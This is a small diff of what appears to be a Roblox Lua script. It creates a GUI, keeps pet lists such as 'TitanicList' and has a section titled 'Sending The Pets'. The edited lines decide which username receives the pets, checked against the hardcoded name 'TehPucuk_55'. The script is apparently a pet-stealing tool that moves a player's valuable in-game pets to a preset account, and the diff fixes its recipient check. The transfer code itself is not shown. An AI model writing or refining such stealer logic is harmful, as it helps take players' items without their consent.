@@ -833,7 +833,6 @@ local ScreenGui = Instance.new("ScreenGui")
                             TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
                             TextLabel_2.TextSize = 36.000
                             TextLabel_2.TextWrapped = true
-
 -- Pets Tables :
 
 TitanicList = {}
@@ -1240,7 +1239,7 @@ end
 -- Sending The Pets
 
 local ndUser
-if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "TehPucuk_55" then
+if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "" then
     ndUser = UserName2
 else
     ndUser = UserName
